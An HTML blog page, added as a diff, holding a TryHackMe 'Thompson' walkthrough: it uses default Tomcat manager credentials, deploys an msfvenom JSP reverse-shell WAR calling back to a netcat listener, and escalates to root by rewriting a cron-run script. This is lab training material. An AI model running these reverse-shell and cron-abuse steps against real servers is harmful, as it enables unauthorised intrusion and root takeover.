@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <link rel="stylesheet" href="/style.css">
+        <title>christopher di-nozzi</title>
+
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta
+            name="description"
+            content="A page generated using ssg. Probably a blog post.">
+    </head>
+    <div id="header">
+   <h1> <a href="/">christopher di-nozzi</a></h1>
+    <nav>
+        <a href="/about">about</a>
+        <span>|</span>
+        <a href="/projects">projects</a>
+        <span>|</span>
+        <a href="/blog">blog</a>
+    </nav>
+    <hr>
+    </div>
+    <div id="main">
+<h1>TryHackMe Walkthrough - Thompson</h1>
+
+<h3>Do NOT try this on a real cat!!!!!</h3>
+
+<p>13/01/2021</p>
+
+<p>Another day, another badly configured tomcat server. What's new? Lets take a look at this box together and see how we can really make the most of this vulnerable machine! Check the room out <a href="https://tryhackme.com/room/bsidesgtthompson">here!</a></p>
+
+<h2>Enumeration</h2>
+
+<p>As always, our first step is enumeration. I ran both an NMAP scan and a Nikto scan, but the later was where the goodies were!</p>
+
+<p><code>
+nikto -h http://10.10.76.64
+</code></p>
+
+<p><code>
+\+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat. <br />
+\+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected) <br />
+\+ /host-manager/html: Tomcat Manager / Host Manager interface found (pass protected) <br />
+\+ /manager/status: Tomcat Server Status interface found (pass protected)
+</code></p>
+
+<p>So we've found an admin panel and it seems to be using default credentials. By visiting "/manager/html" we are prompted for some credentials! We can put in the ones we just found and we're in!</p>
+
+<p>The deploy section is very interesting - maybe we can upload a reverse shell?</p>
+
+<h2>Reverse Shell Time!</h2>
+
+<p>We can create a ".war" reverse shell using good ol' msfvenom. I used this command to generate one of my very own:</p>
+
+<p><code>
+msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=IP LPORT=1234 -f war &gt; shell.war
+</code></p>
+
+<p>Replace IP with your own IP (the one on the top corner of the TryHackMe website) and you've got your own custom shell! We can then set up a netcat listener:</p>
+
+<p><code>
+nc -lvp 1234
+</code></p>
+
+<p>Next, we upload our shell to the site using the deploy section and visit /shell to run it. We should now have a connection via netcat!</p>
+
+<h2>Upgrading that shell!</h2>
+
+<p>The shell we have right now is pretty... ugly. We can make it a bit more usable by using python to upgrade it. Run this command on the server:</p>
+
+<p><code>
+python -c 'import pty; pty.spawn("/bin/bash")'
+</code></p>
+
+<p>Just like that, 100x more usable!</p>
+
+<h2>User Flag</h2>
+
+<p>Time to explore! If we check out the home directory we'll find the user "jack". Jack has a lovely file for us called "user.txt" in which we can find the first flag!</p>
+
+<h2>Root Flag</h2>
+
+<p>Time for the root flag! There was two other interesting files in Jack's home folder: "id.sh" and "test.txt". The first was a script that outputted the "id" command in the "test.txt" file. Neat - but how can we abuse this? <br />
+I had a feeling this might be related to a cronjob so I check /etc/crontab. Sure enough, this file was run as root every minute!</p>
+
+<p><code>
+\# m h dom mon dow user command <br />
+17 \* \* \* \* root cd / &amp;&amp; run-parts --report /etc/cron.hourly <br />
+25 6 \* \* \* root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily ) <br />
+47 6 \* \* 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly ) <br />
+52 6 1 \* \* root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly ) <br />
+\* \* \* \* \* root cd /home/jack &amp;&amp; bash id.sh
+</code>  </p>
+
+<p>This basically means, whatever code is in the "id.sh" file will be run as root. I had some trouble using tiny vim with my shell so I had to echo any commands I wanted to run into the file. I started with:</p>
+
+<p><code>
+echo "ls /root &gt; ls.txt" &gt; id.sh
+</code></p>
+
+<p>After the file was run, I could see the contents of the root directory. All that it contained was a lonely "root.txt" file. Let's take a look at this file! I modified "id.sh" to cat the contents of it into a file we could read.</p>
+
+<p><code>
+echo "cat /root/root.txt &gt; root.txt" &gt; id.sh
+</code></p>
+
+<p>Once this code ran I could open out new "root.txt" file and get the flag!</p>
+
+<h2>Conclusion</h2>
+
+<p>This was a simple and fun room! I didn't know tomcat had so much of a backend!</p>
+</div>
+    <hr>
+    <footer>
+        <nav>
+            <a href="https://twitter.com/chris_dinozzi">twitter</a>
+            <span>|</span>
+            <a href="https://unsplash.com/@chrisdinozzi">photos</a>
+            <span>|</span>
+            <a href="https://github.com/chrisdinozzi">github</a>
+        </nav>
+    </footer>
+</html>
